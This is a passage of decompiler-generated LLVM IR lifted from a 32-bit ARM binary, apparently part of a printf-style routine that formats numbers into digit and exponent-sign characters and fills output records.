bb211:                                            ; preds = %dec_label_pc_14698
  store i32 48, i32* %r3.global-to-local, align 4
  %v5_146a0 = load i32, i32* %r2.global-to-local, align 4
  %v6_146a0 = add i32 %v5_146a0, -1
  %v7_146a0 = inttoptr i32 %v6_146a0 to i8*
  store i8 48, i8* %v7_146a0, align 1
  %v8_146a0 = load i32, i32* %r2.global-to-local, align 4
  %v9_146a0 = add i32 %v8_146a0, -1
  store i32 %v9_146a0, i32* %r2.global-to-local, align 4
  %v0_146a4.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_146d4.pre.pre = load i32, i32* %r1.global-to-local, align 4
  %v0_146d8.pre.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_146d8.pre.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %bb212

bb212:                                            ; preds = %dec_label_pc_14698, %bb211
  %v1_146d8.pre = phi i1 [ %v1_146d8.pre.pre, %bb211 ], [ false, %dec_label_pc_14698 ]
  %v0_146d8.pre = phi i1 [ %v0_146d8.pre.pre, %bb211 ], [ false, %dec_label_pc_14698 ]
  %v1_146d4.pre = phi i32 [ %v1_146d4.pre.pre, %bb211 ], [ %v1_1464c, %dec_label_pc_14698 ]
  %v0_146a4 = phi i32 [ %v0_146a4.pre, %bb211 ], [ %v0_14698, %dec_label_pc_14698 ]
  store i32 %v0_146a4, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_146a8

dec_label_pc_146a8:                               ; preds = %dec_label_pc_1468c, %bb212
  %v0_14778 = phi i32 [ 0, %dec_label_pc_1468c ], [ %v0_146a4, %bb212 ]
  %v1_146dc = phi i1 [ false, %dec_label_pc_1468c ], [ %v1_146d8.pre, %bb212 ]
  %v0_146dc = phi i1 [ false, %dec_label_pc_1468c ], [ %v0_146d8.pre, %bb212 ]
  %v1_146d4 = phi i32 [ %v1_1464c, %dec_label_pc_1468c ], [ %v1_146d4.pre, %bb212 ]
  store i32 1, i32* %stack_var_-168, align 4
  store i32 176, i32* %r5.global-to-local, align 4
  %v2_146b4 = ptrtoint i32* %stack_var_-46 to i32
  store i32 %v2_146b4, i32* %r3.global-to-local, align 4
  %v0_146c0 = load i32, i32* %r2.global-to-local, align 4
  %v1_146c0 = inttoptr i32 %v0_146c0 to i8*
  %v2_146c0 = load i8, i8* %v1_146c0, align 1
  %v3_146c0 = zext i8 %v2_146c0 to i32
  store i32 %v3_146c0, i32* %r3.global-to-local, align 4
  %v5_146c0 = add i32 %v0_146c0, 1
  store i32 %v5_146c0, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %v3_146c0, i32* %stack_var_-46, align 4
  %v2_146d4 = sub i32 %v1_146d4, %v5_146c0
  store i32 %v2_146d4, i32* %r1.global-to-local, align 4
  %v2_146d8 = xor i1 %v1_146dc, %v0_146dc
  br i1 %v2_146d8, label %.thread127, label %dec_label_pc_146e0

.thread127:                                       ; preds = %dec_label_pc_146a8
  %v5_146d8 = ptrtoint i32* %stack_var_-160 to i32
  store i32 %v5_146d8, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14788

dec_label_pc_146e0:                               ; preds = %dec_label_pc_146a8
  store i32 112, i32* %r3.global-to-local, align 4
  %v2_146e4 = sub i32 %v0_14778, %v2_146d4
  %v4_146e4 = xor i32 %v2_146d4, %v0_14778
  %v5_146e4 = xor i32 %v2_146e4, %v0_14778
  %v6_146e4 = and i32 %v5_146e4, %v4_146e4
  %v7_146e4 = icmp slt i32 %v6_146e4, 0
  store i1 %v7_146e4, i1* %cpsr_v.global-to-local, align 1
  %v8_146e4 = icmp slt i32 %v2_146e4, 0
  store i1 %v8_146e4, i1* %cpsr_n.global-to-local, align 1
  %v9_146e4 = icmp eq i32 %v0_14778, %v2_146d4
  store i1 %v9_146e4, i1* %cpsr_z.global-to-local, align 1
  store i32 112, i32* %stack_var_-160, align 4
  %v2_146f0 = xor i1 %v8_146e4, %v7_146e4
  br i1 %v2_146f0, label %bb214, label %dec_label_pc_146f4

dec_label_pc_146f4:                               ; preds = %dec_label_pc_146e0
  store i32 %v2_146e4, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 %v8_146e4, i1* %cpsr_n.global-to-local, align 1
  %v2_146f8 = icmp eq i32 %v2_146e4, 0
  store i1 %v2_146f8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_14358, i32* %lr.global-to-local, align 4
  %tmp213 = icmp slt i32 %v2_146e4, 1
  br i1 %tmp213, label %.thread129, label %dec_label_pc_1470c

.thread129:                                       ; preds = %dec_label_pc_146f4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_14784

dec_label_pc_1470c:                               ; preds = %dec_label_pc_146f4
  store i32 ptrtoint (i32* @global_var_1af8f.853 to i32), i32* %r3.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_14718 = ptrtoint i32* %stack_var_-136 to i32
  store i32 %v2_14718, i32* %r6.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  store i32 176, i32* %stack_var_-148, align 4
  br label %dec_label_pc_14788

bb214:                                            ; preds = %dec_label_pc_146e0
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_14764 = icmp slt i32 %v0_14778, 0
  store i1 %v1_14764, i1* %cpsr_n.global-to-local, align 1
  %v2_14764 = icmp eq i32 %v0_14778, 0
  store i1 %v2_14764, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_14358, i32* %lr.global-to-local, align 4
  %tmp215 = icmp slt i32 %v0_14778, 1
  br i1 %tmp215, label %dec_label_pc_14784, label %dec_label_pc_14774

dec_label_pc_14774:                               ; preds = %bb214
  %v2_14778 = sub i32 %v2_146d4, %v0_14778
  store i32 %v2_14778, i32* %r1.global-to-local, align 4
  %v2_1477c = add i32 %v5_146c0, %v0_14778
  store i32 %v2_1477c, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14784

dec_label_pc_14784:                               ; preds = %dec_label_pc_14774, %.thread129, %bb214
  %storemerge141.in = phi i32* [ %stack_var_-160, %bb214 ], [ %stack_var_-148, %.thread129 ], [ %stack_var_-148, %dec_label_pc_14774 ]
  %v0_1479882 = phi i32 [ %v2_146d4, %bb214 ], [ 0, %.thread129 ], [ %v2_14778, %dec_label_pc_14774 ]
  %storemerge141 = ptrtoint i32* %storemerge141.in to i32
  store i32 %storemerge141, i32* %r6.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_14788

dec_label_pc_14788:                               ; preds = %.thread127, %dec_label_pc_1470c, %dec_label_pc_14784
  %v1_147b8 = phi i32 [ %v2_14718, %dec_label_pc_1470c ], [ %storemerge141, %dec_label_pc_14784 ], [ %v5_146d8, %.thread127 ]
  %v0_147d090 = phi i32 [ -1, %dec_label_pc_1470c ], [ -1, %dec_label_pc_14784 ], [ %v0_14778, %.thread127 ]
  %v0_14798 = phi i32 [ 0, %dec_label_pc_1470c ], [ %v0_1479882, %dec_label_pc_14784 ], [ %v2_146d4, %.thread127 ]
  %v0_14788 = load i32, i32* %fp.global-to-local, align 4
  %v1_14788 = add i32 %v0_14788, 12
  %v2_14788 = inttoptr i32 %v1_14788 to i32*
  %v3_14788 = load i32, i32* %v2_14788, align 4
  %v1_1478c = and i32 %v3_14788, 16
  store i32 %v1_1478c, i32* %lr.global-to-local, align 4
  %v2_1478c = icmp eq i32 %v1_1478c, 0
  %tmp238 = zext i1 %v2_1478c to i32
  %.230 = xor i32 %tmp238, 1
  store i32 %.230, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_14798 = icmp slt i32 %v0_14798, 0
  store i1 %v1_14798, i1* %cpsr_n.global-to-local, align 1
  %v2_14798 = icmp eq i32 %v0_14798, 0
  store i1 %v2_14798, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14798, label %bb218, label %.thread33

.thread33:                                        ; preds = %dec_label_pc_14788
  store i32 1, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_147b4

bb218:                                            ; preds = %dec_label_pc_14788
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 %v2_1478c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1478c, label %dec_label_pc_147a8, label %dec_label_pc_147b4

dec_label_pc_147a8:                               ; preds = %bb218
  %v0_147a8 = load i32, i32* %r7.global-to-local, align 4
  %v1_147a8 = add i32 %v0_147a8, -103
  %v3_147a8 = sub i32 102, %v0_147a8
  %v4_147a8 = and i32 %v3_147a8, %v0_147a8
  %v5_147a8 = icmp slt i32 %v4_147a8, 0
  store i1 %v5_147a8, i1* %cpsr_v.global-to-local, align 1
  %v6_147a8 = icmp slt i32 %v1_147a8, 0
  store i1 %v6_147a8, i1* %cpsr_n.global-to-local, align 1
  %v7_147a8 = icmp eq i32 %v0_147a8, 103
  store i1 %v7_147a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_147a8, label %dec_label_pc_147d0, label %bb219

bb219:                                            ; preds = %dec_label_pc_147a8
  %v1_147ac = load i32, i32* %r8.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v2_147ac = icmp slt i32 %v1_147ac, 0
  store i1 %v2_147ac, i1* %cpsr_n.global-to-local, align 1
  %v3_147ac = icmp eq i32 %v1_147ac, 0
  store i1 %v3_147ac, i1* %cpsr_z.global-to-local, align 1
  %tmp220 = icmp slt i32 %v1_147ac, 1
  br i1 %tmp220, label %dec_label_pc_147d0, label %dec_label_pc_147b4

dec_label_pc_147b4:                               ; preds = %.thread33, %bb218, %bb219
  %v2_147b8 = inttoptr i32 %v1_147b8 to i32*
  store i32 112, i32* %v2_147b8, align 4
  %v1_147c0 = load i32, i32* %r6.global-to-local, align 4
  %v2_147c0 = add i32 %v1_147c0, 4
  %v3_147c0 = inttoptr i32 %v2_147c0 to i32*
  store i32 1, i32* %v3_147c0, align 4
  store i32 ptrtoint (i32* @global_var_1af9c.855 to i32), i32* %r3.global-to-local, align 4
  %v1_147c8 = load i32, i32* %r6.global-to-local, align 4
  %v2_147c8 = add i32 %v1_147c8, 8
  %v3_147c8 = inttoptr i32 %v2_147c8 to i32*
  store i32 ptrtoint (i32* @global_var_1af9c.855 to i32), i32* %v3_147c8, align 4
  %v0_147cc = load i32, i32* %r6.global-to-local, align 4
  %v1_147cc = add i32 %v0_147cc, 12
  store i32 %v1_147cc, i32* %r6.global-to-local, align 4
  %v0_147d0.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_147d0

dec_label_pc_147d0:                               ; preds = %dec_label_pc_147a8, %bb219, %dec_label_pc_147b4
  %v1_147dc = phi i32 [ %v1_147b8, %bb219 ], [ %v1_147cc, %dec_label_pc_147b4 ], [ %v1_147b8, %dec_label_pc_147a8 ]
  %v0_147d0 = phi i32 [ %v0_147d090, %bb219 ], [ %v0_147d0.pre, %dec_label_pc_147b4 ], [ %v0_147d090, %dec_label_pc_147a8 ]
  %v1_147d0 = add i32 %v0_147d0, 1
  store i32 %v1_147d0, i32* %ip.global-to-local, align 4
  %v3_147d0 = sub i32 0, %v0_147d0
  %v4_147d0 = and i32 %v1_147d0, %v3_147d0
  %v5_147d0 = icmp slt i32 %v4_147d0, 0
  store i1 %v5_147d0, i1* %cpsr_v.global-to-local, align 1
  %v6_147d0 = icmp slt i32 %v1_147d0, 0
  store i1 %v6_147d0, i1* %cpsr_n.global-to-local, align 1
  %v7_147d0 = icmp eq i32 %v1_147d0, 0
  store i1 %v7_147d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_147d0, label %dec_label_pc_147f4, label %dec_label_pc_147d8

dec_label_pc_147d8:                               ; preds = %dec_label_pc_147d0
  %v1_147d8 = sub i32 -1, %v0_147d0
  %v2_147dc = add i32 %v1_147dc, 4
  %v3_147dc = inttoptr i32 %v2_147dc to i32*
  store i32 %v1_147d8, i32* %v3_147dc, align 4
  store i32 ptrtoint (i32* @global_var_1af8f.853 to i32), i32* %r3.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  %v1_147e8 = load i32, i32* %r6.global-to-local, align 4
  %v2_147e8 = inttoptr i32 %v1_147e8 to i32*
  store i32 176, i32* %v2_147e8, align 4
  %v0_147ec = load i32, i32* %r3.global-to-local, align 4
  %v1_147ec = load i32, i32* %r6.global-to-local, align 4
  %v2_147ec = add i32 %v1_147ec, 8
  %v3_147ec = inttoptr i32 %v2_147ec to i32*
  store i32 %v0_147ec, i32* %v3_147ec, align 4
  %v0_147f0 = load i32, i32* %r6.global-to-local, align 4
  %v1_147f0 = add i32 %v0_147f0, 12
  store i32 %v1_147f0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_147f4

dec_label_pc_147f4:                               ; preds = %dec_label_pc_147d0, %dec_label_pc_147d8
  %v2_147fc = phi i32 [ %v1_147dc, %dec_label_pc_147d0 ], [ %v1_147f0, %dec_label_pc_147d8 ]
  %v0_147f4 = load i32, i32* %r1.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_147f4 = icmp slt i32 %v0_147f4, 0
  store i1 %v1_147f4, i1* %cpsr_n.global-to-local, align 1
  %v2_147f4 = icmp eq i32 %v0_147f4, 0
  store i1 %v2_147f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_147f4, label %.thread42, label %bb221

bb221:                                            ; preds = %dec_label_pc_147f4
  store i32 112, i32* %r3.global-to-local, align 4
  %v3_147fc = inttoptr i32 %v2_147fc to i32*
  store i32 112, i32* %v3_147fc, align 4
  %v1_14800 = load i32, i32* %r4.global-to-local, align 4
  %v2_14800 = load i32, i32* %r6.global-to-local, align 4
  %v3_14800 = add i32 %v2_14800, 8
  %v4_14800 = inttoptr i32 %v3_14800 to i32*
  store i32 %v1_14800, i32* %v4_14800, align 4
  %v1_14804 = load i32, i32* %r1.global-to-local, align 4
  %v2_14804 = load i32, i32* %r6.global-to-local, align 4
  %v3_14804 = add i32 %v2_14804, 4
  %v4_14804 = inttoptr i32 %v3_14804 to i32*
  store i32 %v1_14804, i32* %v4_14804, align 4
  %v1_14808 = load i32, i32* %r6.global-to-local, align 4
  %v2_14808 = add i32 %v1_14808, 12
  store i32 %v2_14808, i32* %r6.global-to-local, align 4
  br label %.thread42

.thread42:                                        ; preds = %dec_label_pc_147f4, %bb221
  %v1_1482c = phi i32 [ %v2_147fc, %dec_label_pc_147f4 ], [ %v2_14808, %bb221 ]
  %v0_1480c = load i32, i32* %r7.global-to-local, align 4
  %v1_1480c = add i32 %v0_1480c, -103
  %v3_1480c = sub i32 102, %v0_1480c
  %v4_1480c = and i32 %v3_1480c, %v0_1480c
  %v5_1480c = icmp slt i32 %v4_1480c, 0
  store i1 %v5_1480c, i1* %cpsr_v.global-to-local, align 1
  %v6_1480c = icmp slt i32 %v1_1480c, 0
  store i1 %v6_1480c, i1* %cpsr_n.global-to-local, align 1
  %v7_1480c = icmp eq i32 %v0_1480c, 103
  store i1 %v7_1480c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1480c, label %dec_label_pc_14814, label %dec_label_pc_1481c

dec_label_pc_14814:                               ; preds = %.thread42
  %v0_14814 = load i32, i32* %lr.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_14814 = icmp slt i32 %v0_14814, 0
  store i1 %v1_14814, i1* %cpsr_n.global-to-local, align 1
  %v2_14814 = icmp eq i32 %v0_14814, 0
  store i1 %v2_14814, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14814, label %dec_label_pc_14844, label %dec_label_pc_1481c

dec_label_pc_1481c:                               ; preds = %.thread42, %dec_label_pc_14814
  %v0_1481c = load i32, i32* %ip.global-to-local, align 4
  %v1_1481c = load i32, i32* %r1.global-to-local, align 4
  %v2_1481c = sub i32 %v1_1481c, %v0_1481c
  store i32 %v2_1481c, i32* %r3.global-to-local, align 4
  %v1_14820 = load i32, i32* %r8.global-to-local, align 4
  %v2_14820 = sub i32 %v2_1481c, %v1_14820
  %v4_14820 = xor i32 %v1_14820, %v2_1481c
  %v5_14820 = xor i32 %v2_14820, %v2_1481c
  %v6_14820 = and i32 %v5_14820, %v4_14820
  %v7_14820 = icmp slt i32 %v6_14820, 0
  store i1 %v7_14820, i1* %cpsr_v.global-to-local, align 1
  %v8_14820 = icmp slt i32 %v2_14820, 0
  store i1 %v8_14820, i1* %cpsr_n.global-to-local, align 1
  %v9_14820 = icmp eq i32 %v2_1481c, %v1_14820
  store i1 %v9_14820, i1* %cpsr_z.global-to-local, align 1
  %v2_14824 = xor i1 %v8_14820, %v7_14820
  br i1 %v2_14824, label %dec_label_pc_14828, label %dec_label_pc_14844

dec_label_pc_14828:                               ; preds = %dec_label_pc_1481c
  %v2_14828 = sub i32 %v1_14820, %v2_1481c
  %v2_1482c = add i32 %v1_1482c, 4
  %v3_1482c = inttoptr i32 %v2_1482c to i32*
  store i32 %v2_14828, i32* %v3_1482c, align 4
  store i32 ptrtoint (i32* @global_var_1af8f.853 to i32), i32* %r3.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  %v1_14838 = load i32, i32* %r6.global-to-local, align 4
  %v2_14838 = inttoptr i32 %v1_14838 to i32*
  store i32 176, i32* %v2_14838, align 4
  %v0_1483c = load i32, i32* %r3.global-to-local, align 4
  %v1_1483c = load i32, i32* %r6.global-to-local, align 4
  %v2_1483c = add i32 %v1_1483c, 8
  %v3_1483c = inttoptr i32 %v2_1483c to i32*
  store i32 %v0_1483c, i32* %v3_1483c, align 4
  %v0_14840 = load i32, i32* %r6.global-to-local, align 4
  %v1_14840 = add i32 %v0_14840, 12
  store i32 %v1_14840, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14844

dec_label_pc_14844:                               ; preds = %dec_label_pc_1481c, %dec_label_pc_14814, %dec_label_pc_14828
  %v1_148d8.pre.pre = phi i32 [ %v1_1482c, %dec_label_pc_1481c ], [ %v1_1482c, %dec_label_pc_14814 ], [ %v1_14840, %dec_label_pc_14828 ]
  %v0_14844 = load i32, i32* %sl.global-to-local, align 4
  %v1_14844 = add i32 %v0_14844, -102
  %v3_14844 = sub i32 101, %v0_14844
  %v4_14844 = and i32 %v3_14844, %v0_14844
  %v5_14844 = icmp slt i32 %v4_14844, 0
  store i1 %v5_14844, i1* %cpsr_v.global-to-local, align 1
  %v6_14844 = icmp slt i32 %v1_14844, 0
  store i1 %v6_14844, i1* %cpsr_n.global-to-local, align 1
  %v7_14844 = icmp eq i32 %v0_14844, 102
  store i1 %v7_14844, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_14844, label %dec_label_pc_148cc, label %dec_label_pc_1484c

dec_label_pc_1484c:                               ; preds = %dec_label_pc_14844
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_14850 = load i32, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_14850 = icmp slt i32 %v0_14850, 0
  store i1 %v1_14850, i1* %cpsr_n.global-to-local, align 1
  %v2_14850 = icmp eq i32 %v0_14850, 0
  store i1 %v2_14850, i1* %cpsr_z.global-to-local, align 1
  %v4_14854 = zext i8 %stack_var_-66.0108114 to i32
  store i32 %v4_14854, i32* %r8.global-to-local, align 4
  store i32 0, i32* %stack_var_-51, align 4
  %v4_14864 = sub i32 0, %v0_14850
  %storemerge140 = select i1 %v1_14850, i32 %v4_14864, i32 %v0_14850
  %tmp239 = ashr i32 %v0_14850, 31
  %tmp240 = and i32 %tmp239, 2
  %tmp241 = add nuw nsw i32 %tmp240, 43
  store i32 %storemerge140, i32* %r4.global-to-local, align 4
  store i32 %tmp241, i32* %sl.global-to-local, align 4
  %v2_1486c = ptrtoint i32* %stack_var_-51 to i32
  store i32 %v2_1486c, i32* %r5.global-to-local, align 4
  store i32 2, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_14874

dec_label_pc_14874:                               ; preds = %dec_label_pc_148a4, %dec_label_pc_14874, %dec_label_pc_1484c
  %v2_1488c = phi i32 [ %v2_1486c, %dec_label_pc_1484c ], [ %v6_1488c, %dec_label_pc_14874 ], [ %v6_1488c, %dec_label_pc_148a4 ]
  %v0_14888 = phi i32 [ %storemerge140, %dec_label_pc_1484c ], [ %v2_14890, %dec_label_pc_14874 ], [ %v2_14890, %dec_label_pc_148a4 ]
  %v2_1487c = srem i32 %v0_14888, 10
  %v1_14880 = add nsw i32 %v2_1487c, 48
  store i32 %v1_14880, i32* %r3.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  store i32 %v0_14888, i32* %r0.global-to-local, align 4
  %v1_1488c = trunc i32 %v1_14880 to i8
  %v3_1488c = add i32 %v2_1488c, -1
  %v4_1488c = inttoptr i32 %v3_1488c to i8*
  store i8 %v1_1488c, i8* %v4_1488c, align 1
  %v5_1488c = load i32, i32* %r5.global-to-local, align 4
  %v6_1488c = add i32 %v5_1488c, -1
  store i32 %v6_1488c, i32* %r5.global-to-local, align 4
  %v0_14890 = load i32, i32* %r0.global-to-local, align 4
  %v1_14890 = load i32, i32* %r1.global-to-local, align 4
  %v2_14890 = sdiv i32 %v0_14890, %v1_14890
  store i32 %v2_14890, i32* %r0.global-to-local, align 4
  %v0_14894 = load i32, i32* %r7.global-to-local, align 4
  %v1_14894 = add i32 %v0_14894, 1
  store i32 %v1_14894, i32* %r7.global-to-local, align 4
  %v1_14898 = add i32 %v0_14894, -2
  %v3_14898 = sub i32 1, %v0_14894
  %v4_14898 = and i32 %v3_14898, %v1_14894
  %v5_14898 = icmp slt i32 %v4_14898, 0
  store i1 %v5_14898, i1* %cpsr_v.global-to-local, align 1
  %v6_14898 = icmp slt i32 %v1_14898, 0
  store i1 %v6_14898, i1* %cpsr_n.global-to-local, align 1
  %v7_14898 = icmp eq i32 %v1_14894, 3
  store i1 %v7_14898, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_14890, i32* %r4.global-to-local, align 4
  %v7_148a0 = icmp slt i32 %v1_14894, 4
  br i1 %v7_148a0, label %dec_label_pc_14874, label %dec_label_pc_148a4

dec_label_pc_148a4:                               ; preds = %dec_label_pc_14874
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_148a4 = icmp slt i32 %v2_14890, 0
  store i1 %v1_148a4, i1* %cpsr_n.global-to-local, align 1
  %v2_148a4 = icmp eq i32 %v2_14890, 0
  store i1 %v2_148a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_148a4, label %dec_label_pc_148ac, label %dec_label_pc_14874

dec_label_pc_148ac:                               ; preds = %dec_label_pc_148a4
  %v1_148ac = add i32 %v5_1488c, -2
  store i32 %v1_148ac, i32* %r3.global-to-local, align 4
  %v0_148b0 = load i32, i32* %sl.global-to-local, align 4
  %v1_148b0 = trunc i32 %v0_148b0 to i8
  %v4_148b0 = inttoptr i32 %v1_148ac to i8*
  store i8 %v1_148b0, i8* %v4_148b0, align 1
  %v0_148b4 = load i32, i32* %r3.global-to-local, align 4
  %v1_148b4 = add i32 %v0_148b4, -1
  store i32 %v1_148b4, i32* %r2.global-to-local, align 4
  %v0_148b8 = load i32, i32* %r8.global-to-local, align 4
  %v1_148b8 = trunc i32 %v0_148b8 to i8
  %v4_148b8 = inttoptr i32 %v1_148b4 to i8*
  store i8 %v1_148b8, i8* %v4_148b8, align 1
  store i32 112, i32* %r3.global-to-local, align 4
  %v0_148c0 = load i32, i32* %r6.global-to-local, align 4
  %v1_148c0 = inttoptr i32 %v0_148c0 to i32*
  store i32 112, i32* %v1_148c0, align 4
  %v3_148c0 = add i32 %v0_148c0, 4
  %v4_148c0 = inttoptr i32 %v3_148c0 to i32*
  %v5_148c0 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v5_148c0, i32* %v4_148c0, align 4
  %v0_148c4 = load i32, i32* %r2.global-to-local, align 4
  %v1_148c4 = load i32, i32* %r6.global-to-local, align 4
  %v2_148c4 = add i32 %v1_148c4, 8
  %v3_148c4 = inttoptr i32 %v2_148c4 to i32*
  store i32 %v0_148c4, i32* %v3_148c4, align 4
  %v0_148c8 = load i32, i32* %r6.global-to-local, align 4
  %v1_148c8 = add i32 %v0_148c8, 12
  store i32 %v1_148c8, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_148cc

dec_label_pc_148cc:                               ; preds = %dec_label_pc_14844, %.thread105, %dec_label_pc_148ac
  %v1_148d8.pre = phi i32 [ %v2_14444, %.thread105 ], [ %v1_148c8, %dec_label_pc_148ac ], [ %v1_148d8.pre.pre, %dec_label_pc_14844 ]
  %v2_148cc = ptrtoint i32* %stack_var_-168 to i32
  store i32 %v2_148cc, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_148d0

dec_label_pc_148d0:                               ; preds = %dec_label_pc_148d0, %dec_label_pc_148cc
  %v0_148d0 = phi i32 [ %v2_148cc, %dec_label_pc_148cc ], [ %v4_148d0, %dec_label_pc_148d0 ]
  %stack_var_-188.0 = phi i32 [ %v3_1437c, %dec_label_pc_148cc ], [ %v2_148dc, %dec_label_pc_148d0 ]
  %v1_148d0 = inttoptr i32 %v0_148d0 to i32*
  %v2_148d0 = load i32, i32* %v1_148d0, align 4
  store i32 %v2_148d0, i32* %r3.global-to-local, align 4
  %v4_148d0 = add i32 %v0_148d0, 12
  store i32 %v4_148d0, i32* %r2.global-to-local, align 4
  %v3_148d8 = icmp ult i32 %v4_148d0, %v1_148d8.pre
  %v2_148dc = sub i32 %stack_var_-188.0, %v2_148d0
  store i32 %v2_148dc, i32* %ip.global-to-local, align 4
  br i1 %v3_148d8, label %dec_label_pc_148d0, label %dec_label_pc_148e8

dec_label_pc_148e8:                               ; preds = %dec_label_pc_148d0
  %v3_148e8 = load i8, i8* %stack_var_-50, align 1
  %v4_148e8 = sext i8 %v3_148e8 to i32
  store i32 %v4_148e8, i32* %r3.global-to-local, align 4
  store i32 %v4_148e8, i32* %r2.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_148ec = icmp slt i8 %v3_148e8, 0
  store i1 %v1_148ec, i1* %cpsr_n.global-to-local, align 1
  %v2_148ec = icmp eq i8 %v3_148e8, 0
  store i1 %v2_148ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_148ec, label %bb226, label %bb225

bb225:                                            ; preds = %dec_label_pc_148e8
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb226

bb226:                                            ; preds = %dec_label_pc_148e8, %bb225
  %v1_14938 = phi i32 [ %v4_148e8, %dec_label_pc_148e8 ], [ 1, %bb225 ]
  %v2_148f4 = sub i32 %v2_148dc, %v1_14938
  store i32 %v2_148f4, i32* %r1.global-to-local, align 4
  store i32 160, i32* %r0.global-to-local, align 4
  %v2_148fc = ptrtoint i8* %stack_var_-50 to i32
  store i32 %v2_148fc, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_14900 = icmp slt i32 %v2_148f4, 0
  store i1 %v1_14900, i1* %cpsr_n.global-to-local, align 1
  %v2_14900 = icmp eq i32 %v2_148f4, 0
  store i1 %v2_14900, i1* %cpsr_z.global-to-local, align 1
  store i32 160, i32* %stack_var_-184, align 4
  %tmp227 = icmp slt i32 %v2_148f4, 1
  br i1 %tmp227, label %dec_label_pc_14960, label %dec_label_pc_14914

dec_label_pc_14914:                               ; preds = %bb226
  %v0_14914 = load i32, i32* %fp.global-to-local, align 4
  %v1_14914 = add i32 %v0_14914, 12
  %v2_14914 = inttoptr i32 %v1_14914 to i32*
  %v3_14914 = load i32, i32* %v2_14914, align 4
  store i32 %v3_14914, i32* %r3.global-to-local, align 4
  %v1_14918 = and i32 %v3_14914, 8
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_14918 = icmp eq i32 %v1_14918, 0
  store i1 %v2_14918, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14918, label %dec_label_pc_14930, label %dec_label_pc_14920

dec_label_pc_14920:                               ; preds = %dec_label_pc_14914
  store i32 ptrtoint (i32* @global_var_1af8f.853 to i32), i32* %r3.global-to-local, align 4
  %v1_14924 = add i32 %v1_148d8.pre, 12
  store i32 %v1_14924, i32* %r5.global-to-local, align 4
  %v1_14928 = inttoptr i32 %v1_148d8.pre to i32*
  store i32 160, i32* %v1_14928, align 4
  %v3_14928 = add i32 %v1_148d8.pre, 4
  %v4_14928 = inttoptr i32 %v3_14928 to i32*
  %v5_14928 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_14928, i32* %v4_14928, align 4
  %v6_14928 = add i32 %v1_148d8.pre, 8
  %v7_14928 = inttoptr i32 %v6_14928 to i32*
  %v8_14928 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v8_14928, i32* %v7_14928, align 4
  br label %dec_label_pc_14964

dec_label_pc_14930:                               ; preds = %dec_label_pc_14914
  %v1_14930 = add i32 %v0_14914, 16
  %v2_14930 = inttoptr i32 %v1_14930 to i32*
  %v3_14930 = load i32, i32* %v2_14930, align 4
  store i32 %v3_14930, i32* %r3.global-to-local, align 4
  %v1_14934 = add i32 %v3_14930, -48
  %v3_14934 = sub i32 47, %v3_14930
  %v4_14934 = and i32 %v3_14934, %v3_14930
  %v5_14934 = icmp slt i32 %v4_14934, 0
  store i1 %v5_14934, i1* %cpsr_v.global-to-local, align 1
  %v6_14934 = icmp slt i32 %v1_14934, 0
  store i1 %v6_14934, i1* %cpsr_n.global-to-local, align 1
  %v7_14934 = icmp eq i32 %v3_14930, 48
